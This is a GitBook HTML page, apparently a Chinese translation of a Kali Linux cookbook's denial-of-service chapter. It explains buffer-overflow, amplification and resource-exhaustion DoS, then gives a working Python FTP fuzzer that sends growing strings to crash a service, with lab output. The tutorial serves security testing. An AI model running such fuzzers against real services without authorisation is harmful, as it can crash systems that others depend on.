@@ -1,0 +1,1729 @@
+
+<!DOCTYPE HTML>
+<html lang="zh" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>第六章 拒绝服务 · Kali Linux 网络扫描秘籍</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.2">
+        <meta name="author" content="wizardforcel">
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-comment/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="ch7.html" />
+    
+    
+    <link rel="prev" href="ch5.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="輸入並搜尋" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://www.gitbook.com/book/wizardforcel/kali-linux-network-scanning-cookbook" target="_blank" class="custom-link">Kali Linux 网络扫描秘籍</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Kali Linux 网络扫描秘籍 中文版
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="ch1.html">
+            
+                <a href="ch1.html">
+            
+                    
+                    第一章 起步
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="ch2.html">
+            
+                <a href="ch2.html">
+            
+                    
+                    第二章 探索扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="ch3.html">
+            
+                <a href="ch3.html">
+            
+                    
+                    第三章 端口扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="ch4.html">
+            
+                <a href="ch4.html">
+            
+                    
+                    第四章 指纹识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="ch5.html">
+            
+                <a href="ch5.html">
+            
+                    
+                    第五章 漏洞扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.7" data-path="ch6.html">
+            
+                <a href="ch6.html">
+            
+                    
+                    第六章 拒绝服务
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="ch7.html">
+            
+                <a href="ch7.html">
+            
+                    
+                    第七章 Web 应用扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="ch8.html">
+            
+                <a href="ch8.html">
+            
+                    
+                    第八章 自动化 Kali 工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本書使用 GitBook 釋出
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >第六章 拒绝服务</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x7B2C;&#x516D;&#x7AE0;-&#x62D2;&#x7EDD;&#x670D;&#x52A1;">&#x7B2C;&#x516D;&#x7AE0; &#x62D2;&#x7EDD;&#x670D;&#x52A1;</h1>
+<blockquote>
+<p>&#x4F5C;&#x8005;&#xFF1A;Justin Hutchens</p>
+<p>&#x8BD1;&#x8005;&#xFF1A;<a href="https://github.com/" target="_blank">&#x98DE;&#x9F99;</a></p>
+<p>&#x534F;&#x8BAE;&#xFF1A;<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></p>
+</blockquote>
+<p>&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#xFF0C;&#x5F53;&#x4F60;&#x901A;&#x8FC7;&#x4E92;&#x8054;&#x7F51;&#x8BBF;&#x95EE;&#x516C;&#x5F00;&#x8D44;&#x6E90;&#xFF0C;&#x751A;&#x81F3;&#x901A;&#x8FC7;&#x5185;&#x90E8;&#x7F51;&#x7EDC;&#x8BBF;&#x95EE;&#x5C0F;&#x578B;&#x793E;&#x533A;&#x65F6;&#xFF0C;&#x91CD;&#x8981;&#x7684;&#x662F;&#x8981;&#x8003;&#x8651;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#xFF08;DoS&#xFF09;&#x653B;&#x51FB;&#x7684;&#x98CE;&#x9669;&#x3002; DoS &#x653B;&#x51FB;&#x53EF;&#x80FD;&#x4EE4;&#x4EBA;&#x6CAE;&#x4E27;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x80FD;&#x975E;&#x5E38;&#x6602;&#x8D35;&#x3002; &#x6700;&#x7CDF;&#x7CD5;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x4E9B;&#x5A01;&#x80C1;&#x5F80;&#x5F80;&#x662F;&#x4E00;&#x4E9B;&#x6700;&#x96BE;&#x4EE5;&#x7F13;&#x89E3;&#x7684;&#x5A01;&#x80C1;&#x3002; &#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x6B63;&#x786E;&#x8BC4;&#x4F30;&#x5BF9;&#x7F51;&#x7EDC;&#x548C;&#x4FE1;&#x606F;&#x8D44;&#x6E90;&#x7684;&#x5A01;&#x80C1;&#xFF0C;&#x5FC5;&#x987B;&#x4E86;&#x89E3;&#x73B0;&#x6709;&#x7684; DoS &#x5A01;&#x80C1;&#x7684;&#x7C7B;&#x578B;&#x4EE5;&#x53CA;&#x4E0E;&#x4E4B;&#x76F8;&#x5173;&#x7684;&#x8D8B;&#x52BF;&#x3002; </p>
+<p>&#x5728;&#x5355;&#x72EC;&#x8BA8;&#x8BBA;&#x5217;&#x51FA;&#x7684;&#x6BCF;&#x4E2A;&#x79D8;&#x7C4D;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5F3A;&#x8C03;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x539F;&#x5219;&#xFF0C;&#x5E76;&#x4E86;&#x89E3;&#x5B83;&#x4EEC;&#x5982;&#x4F55;&#x4E0E;&#x672C;&#x7AE0;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684; DoS &#x653B;&#x51FB;&#x76F8;&#x5173;&#x3002; &#x6211;&#x4EEC;&#x5C06;&#x5728;&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x79D8;&#x7C4D;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684; DoS &#x653B;&#x51FB;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#xFF0C;&#x6D41;&#x91CF;&#x653E;&#x5927;&#x653B;&#x51FB;&#x6216;&#x8D44;&#x6E90;&#x6D88;&#x8017;&#x653B;&#x51FB;&#x3002; &#x6211;&#x4EEC;&#x5C06;&#x6309;&#x6B64;&#x987A;&#x5E8F;&#x8BA8;&#x8BBA;&#x4E0E;&#x8FD9;&#x4E9B;&#x7C7B;&#x578B;&#x7684;&#x653B;&#x51FB;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x76F8;&#x5173;&#x7684;&#x4E00;&#x822C;&#x539F;&#x5219;&#x3002;</p>
+<p>&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x662F;&#x4E00;&#x79CD;&#x7F16;&#x7A0B;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x670D;&#x52A1;&#x6216;&#x6574;&#x4E2A;&#x5E95;&#x5C42;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x3002; &#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x80FD;&#x591F;&#x5BFC;&#x81F4;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x88AB;&#x52A0;&#x8F7D;&#x5230;&#x975E;&#x9884;&#x671F;&#x7684;&#x5185;&#x5B58;&#x6BB5;&#x3002; &#x8FD9;&#x53EF;&#x80FD;&#x4F1A;&#x4E2D;&#x65AD;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x6216;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x3002; &#x6D41;&#x91CF;&#x653E;&#x5927; DoS &#x653B;&#x51FB;&#x80FD;&#x591F;&#x901A;&#x8FC7;&#x6D88;&#x8017;&#x7279;&#x5B9A;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8BBE;&#x5907;&#x6216;&#x7F51;&#x7EDC;&#x53EF;&#x7528;&#x7684;&#x7F51;&#x7EDC;&#x5E26;&#x5BBD;&#x6765;&#x4EA7;&#x751F; DoS &#x6761;&#x4EF6;&#x3002; &#x6D41;&#x91CF;&#x653E;&#x5927;&#x653B;&#x51FB;&#x9700;&#x8981;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x624D;&#x80FD;&#x6210;&#x529F;&#x3002; &#x8FD9;&#x4E9B;&#x6761;&#x4EF6;&#x5982;&#x4E0B;&#xFF1A;</p>
+<ul>
+<li>&#x91CD;&#x5B9A;&#x5411;&#xFF1A;&#x653B;&#x51FB;&#x8005;&#x5FC5;&#x987B;&#x80FD;&#x591F;&#x8BF7;&#x6C42;&#x53EF;&#x4EE5;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x53D7;&#x5BB3;&#x8005;&#x7684;&#x54CD;&#x5E94;&#x3002; &#x8FD9;&#x901A;&#x5E38;&#x901A;&#x8FC7; IP &#x6B3A;&#x9A97;&#x6765;&#x5B9E;&#x73B0;&#x3002; &#x56E0;&#x4E3A; UDP &#x4E0D;&#x662F;&#x9762;&#x5411;&#x8FDE;&#x63A5;&#x7684;&#x534F;&#x8BAE;&#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528; UDP &#x4F5C;&#x4E3A;&#x5176;&#x76F8;&#x5173;&#x7684;&#x4F20;&#x8F93;&#x5C42;&#x534F;&#x8BAE;&#x7684;&#x5927;&#x591A;&#x6570;&#x5E94;&#x7528;&#x5C42;&#x534F;&#x8BAE;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x901A;&#x8FC7;&#x4F2A;&#x9020;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5C06;&#x670D;&#x52A1;&#x54CD;&#x5E94;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x3002; </li>
+<li>&#x653E;&#x5927;&#xFF1A;&#x91CD;&#x5B9A;&#x5411;&#x7684;&#x54CD;&#x5E94;&#x5FC5;&#x987B;&#x5927;&#x4E8E;&#x8BF7;&#x6C42;&#x8BE5;&#x54CD;&#x5E94;&#x7684;&#x8BF7;&#x6C42;&#x3002; &#x54CD;&#x5E94;&#x5B57;&#x8282;&#x5927;&#x5C0F;&#x548C;&#x8BF7;&#x6C42;&#x5B57;&#x8282;&#x5927;&#x5C0F;&#x7684;&#x6BD4;&#x7387;&#x8D8A;&#x5927;&#xFF0C;&#x653B;&#x51FB;&#x5C31;&#x8D8A;&#x6210;&#x529F;&#x3002;</li>
+</ul>
+<p>&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x4E86;&#x751F;&#x6210; 10 &#x500D;&#x4E8E;&#x76F8;&#x5173;&#x8BF7;&#x6C42;&#x7684;&#x54CD;&#x5E94;&#x7684; UDP &#x670D;&#x52A1;&#xFF0C;&#x5219;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8BE5;&#x670D;&#x52A1;&#x6765;&#x6F5C;&#x5728;&#x5730;&#x751F;&#x6210; 10 &#x500D;&#x7684;&#x653B;&#x51FB;&#x6D41;&#x91CF;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x901A;&#x8FC7;&#x5C06;&#x4F2A;&#x9020;&#x7684;&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x5230; &#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#xFF0C;&#x4EE5;&#x53EF;&#x80FD;&#x6700;&#x9AD8;&#x7684;&#x901F;&#x7387;&#x4F20;&#x8F93;&#x3002; &#x8D44;&#x6E90;&#x6D88;&#x8017;&#x653B;&#x51FB;&#x662F;&#x4EA7;&#x751F;&#x5982;&#x4E0B;&#x7684;&#x6761;&#x4EF6;&#x7684;&#x653B;&#x51FB;&#xFF0C;&#x5176;&#x4E2D;&#x4E3B;&#x673A;&#x670D;&#x52A1;&#x5668;&#x6216;&#x8BBE;&#x5907;&#x7684;&#x672C;&#x5730;&#x8D44;&#x6E90;&#x88AB;&#x6D88;&#x8017;&#x5230;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#xFF0C;&#x4F7F;&#x5F97;&#x8FD9;&#x4E9B;&#x8D44;&#x6E90;&#x4E0D;&#x518D;&#x80FD;&#x591F;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x5176;&#x9884;&#x671F;&#x7684;&#x64CD;&#x4F5C;&#x529F;&#x80FD;&#x3002; &#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x653B;&#x51FB;&#x53EF;&#x4EE5;&#x9488;&#x5BF9;&#x5404;&#x79CD;&#x672C;&#x5730;&#x8D44;&#x6E90;&#xFF0C;&#x5305;&#x62EC;&#x5185;&#x5B58;&#xFF0C;&#x5904;&#x7406;&#x5668;&#x6027;&#x80FD;&#xFF0C;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#x6216;&#x5E76;&#x53D1;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x7684;&#x53EF;&#x6301;&#x7EED;&#x6027;&#x3002;</p>
+<h2 id="61-&#x4F7F;&#x7528;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x6765;&#x8BC6;&#x522B;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;">6.1 &#x4F7F;&#x7528;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x6765;&#x8BC6;&#x522B;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;</h2>
+<p>&#x8BC6;&#x522B;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;&#x7684;&#x6700;&#x6709;&#x6548;&#x7684;&#x6280;&#x672F;&#x4E4B;&#x4E00;&#x662F;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x3002; &#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x901A;&#x8FC7;&#x5C06;&#x7CBE;&#x5DE7;&#x7684;&#x6216;&#x968F;&#x673A;&#x6570;&#x636E;&#x4F20;&#x9012;&#x7ED9;&#x51FD;&#x6570;&#xFF0C;&#x6765;&#x6D4B;&#x8BD5;&#x4E0E;&#x5404;&#x79CD;&#x8F93;&#x5165;&#x76F8;&#x5173;&#x7684;&#x7ED3;&#x679C;&#x3002; &#x5728;&#x6B63;&#x786E;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;&#x6570;&#x636E;&#x53EF;&#x80FD;&#x9003;&#x79BB;&#x5176;&#x6307;&#x5B9A;&#x7684;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x5E76;&#x6D41;&#x5165;&#x76F8;&#x90BB;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x6216;&#x5185;&#x5B58;&#x6BB5;&#x3002; &#x6B64;&#x8FC7;&#x7A0B;&#x5C06;&#x4E2D;&#x65AD;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#x5E76;&#x5BFC;&#x81F4;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6216;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x3002; &#x5728;&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x672A;&#x7ECF;&#x6388;&#x6743;&#x7684;&#x4EE3;&#x7801;&#x3002; &#x5728;&#x8FD9;&#x4E2A;&#x79D8;&#x7C4D;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x8BA8;&#x8BBA;&#x5982;&#x4F55;&#x901A;&#x8FC7;&#x5F00;&#x53D1;&#x81EA;&#x5B9A;&#x4E49;&#x7684;Fuzzing&#x5DE5;&#x5177;&#xFF0C;&#x6765;&#x6D4B;&#x8BD5;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x6267;&#x884C;&#x8FDC;&#x7A0B;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x8FD0;&#x884C; TCP &#x6216; UDP &#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x7684;&#x7CFB;&#x7EDF;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x4F7F;&#x7528;&#x4E86;&#x62E5;&#x6709; FTP &#x670D;&#x52A1;&#x7684; Windows XP &#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>Python &#x662F;&#x4E00;&#x79CD;&#x4F18;&#x79C0;&#x7684;&#x811A;&#x672C;&#x8BED;&#x8A00;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x9AD8;&#x6548;&#x5F00;&#x53D1;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#x3002; &#x5F53;&#x8BC4;&#x4F30; TCP &#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x5957;&#x63A5;&#x5B57;&#x51FD;&#x6570;&#x53EF;&#x7528;&#x4E8E;&#x7B80;&#x5316;&#x6267;&#x884C;&#x5B8C;&#x5168;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x5E8F;&#x5217;&#xFF0C;&#x548C;&#x8FDE;&#x63A5;&#x5230;&#x76D1;&#x542C;&#x670D;&#x52A1;&#x7AEF;&#x53E3;&#x7684;&#x8FC7;&#x7A0B;&#x3002; &#x4EFB;&#x4F55;&#x6A21;&#x7CCA;&#x811A;&#x672C;&#x7684;&#x4E3B;&#x8981;&#x76EE;&#x7684;&#x662F;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x4F5C;&#x4E3A;&#x8F93;&#x5165;&#x53D1;&#x9001;&#x5230;&#x4EFB;&#x4F55;&#x7ED9;&#x5B9A;&#x7684;&#x51FD;&#x6570;&#x5E76;&#x8BC4;&#x4F30;&#x7ED3;&#x679C;&#x3002; &#x6211;&#x5F00;&#x53D1;&#x4E86;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5; FTP &#x670D;&#x52A1;&#x7684;&#x9A8C;&#x8BC1;&#x540E;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code class="lang-py"><span class="hljs-comment">#!/usr/bin/python</span>
+
+<span class="hljs-keyword">import</span> socket 
+<span class="hljs-keyword">import</span> sys
+
+<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">6</span>:   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Payload] [Interval] [Maximum]&quot;</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Example - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000&quot;</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Example will fuzz the defined FTP service with a series of payloads&quot;</span>   
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;to include 100 &apos;A&apos;s, 200 &apos;A&apos;s, etc... up to the maximum of 1000&quot;</span>   
+    sys.exit()
+
+target = str(sys.argv[<span class="hljs-number">1</span>]) 
+port = int(sys.argv[<span class="hljs-number">2</span>]) 
+char = str(sys.argv[<span class="hljs-number">3</span>]) 
+i = int(sys.argv[<span class="hljs-number">4</span>]) 
+interval = int(sys.argv[<span class="hljs-number">4</span>]) 
+max = int(sys.argv[<span class="hljs-number">5</span>]) 
+user = raw_input(str(<span class="hljs-string">&quot;Enter ftp username: &quot;</span>)) 
+passwd = raw_input(str(<span class="hljs-string">&quot;Enter ftp password: &quot;</span>)) 
+command = raw_input(str(<span class="hljs-string">&quot;Enter FTP command to fuzz: &quot;</span>))
+
+<span class="hljs-keyword">while</span> i &lt;= max:   
+    <span class="hljs-keyword">try</span>:      
+        payload = command + <span class="hljs-string">&quot; &quot;</span> + (char * i)      
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Sending &quot;</span> + str(i) + <span class="hljs-string">&quot; instances of payload (&quot;</span> + char + <span class="hljs-string">&quot;) to target&quot;</span>      
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)      
+        connect=s.connect((target,port))      
+        s.recv(<span class="hljs-number">1024</span>)      
+        s.send(<span class="hljs-string">&apos;USER &apos;</span> + user + <span class="hljs-string">&apos;\r\n&apos;</span>)      
+        s.recv(<span class="hljs-number">1024</span>)      
+        s.send(<span class="hljs-string">&apos;PASS &apos;</span> + passwd + <span class="hljs-string">&apos;\r\n&apos;</span>)
+        s.recv(<span class="hljs-number">1024</span>)
+        s.send(payload + <span class="hljs-string">&apos;\r\n&apos;</span>)
+        s.send(<span class="hljs-string">&apos;QUIT\r\n&apos;</span>)
+        s.recv(<span class="hljs-number">1024</span>)
+        s.close()
+        i = i + interval
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\nUnable to send...Server may have crashed&quot;</span>
+        sys.exit()
+
+<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\nThere is no indication that the server has crashed&quot;</span>
+</code></pre>
+<p>&#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E00;&#x90E8;&#x5206;&#x5B9A;&#x4E49;&#x4E86; Python &#x89E3;&#x91CA;&#x5668;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x5BFC;&#x5165;&#x6240;&#x9700;&#x7684;&#x5E93;&#x3002; &#x7B2C;&#x4E8C;&#x90E8;&#x5206;&#x68C0;&#x67E5;&#x63D0;&#x4F9B;&#x7684;&#x53C2;&#x6570;&#x6570;&#x91CF;&#xFF0C;&#x4EE5;&#x786E;&#x4FDD;&#x5176;&#x4E0E;&#x811A;&#x672C;&#x7684;&#x9002;&#x5F53;&#x7528;&#x6CD5;&#x4E00;&#x81F4;&#x3002; &#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E09;&#x90E8;&#x5206;&#x5B9A;&#x4E49;&#x5C06;&#x5728;&#x6574;&#x4E2A;&#x811A;&#x672C;&#x6267;&#x884C;&#x671F;&#x95F4;&#x4F7F;&#x7528;&#x7684;&#x53D8;&#x91CF;&#x3002; &#x5176;&#x4E2D;&#x51E0;&#x4E2A;&#x53D8;&#x91CF;&#x4ECE;&#x7CFB;&#x7EDF;&#x53C2;&#x6570;&#x4E2D;&#x63A5;&#x6536;&#x5230;&#x5B83;&#x4EEC;&#x7684;&#x503C;&#xFF0C;&#x8FD9;&#x4E9B;&#x53C2;&#x6570;&#x5728;&#x6267;&#x884C;&#x65F6;&#x4F20;&#x9012;&#x7ED9;&#x811A;&#x672C;&#x3002; &#x5269;&#x4F59;&#x7684;&#x53D8;&#x91CF;&#x901A;&#x8FC7;&#x63A5;&#x53D7;&#x811A;&#x672C;&#x7684;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;&#x6765;&#x5B9A;&#x4E49;&#x3002; &#x6700;&#x540E;&#xFF0C;&#x811A;&#x672C;&#x7684;&#x5176;&#x4F59;&#x90E8;&#x5206;&#x5B9A;&#x4E49;&#x4E86;&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x8FC7;&#x7A0B;&#x3002; &#x6211;&#x4EEC;&#x6267;&#x884C;<code>ftp_fuzz.py</code>&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ./ftp_fuzz.py 
+Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Payload] [Interval] [Maximum] 
+Example - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000 
+Example will fuzz the defined FTP service with a series of payloads to include 100 &apos;A&apos;s, 200 &apos;A&apos;s, etc... up to the maximum of 1000 
+root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 A 100 1000 
+Enter ftp username: anonymous 
+Enter ftp password: user@mail.com 
+Enter FTP command to fuzz: MKD
+
+Sending 100 instances of payload (A) to target 
+Sending 200 instances of payload (A) to target 
+Sending 300 instances of payload (A) to target 
+Sending 400 instances of payload (A) to target 
+Sending 500 instances of payload (A) to target 
+Sending 600 instances of payload (A) to target 
+Sending 700 instances of payload (A) to target 
+Sending 800 instances of payload (A) to target 
+Sending 900 instances of payload (A) to target 
+Sending 1000 instances of payload (A) to target
+
+There is no indication that the server has crashed
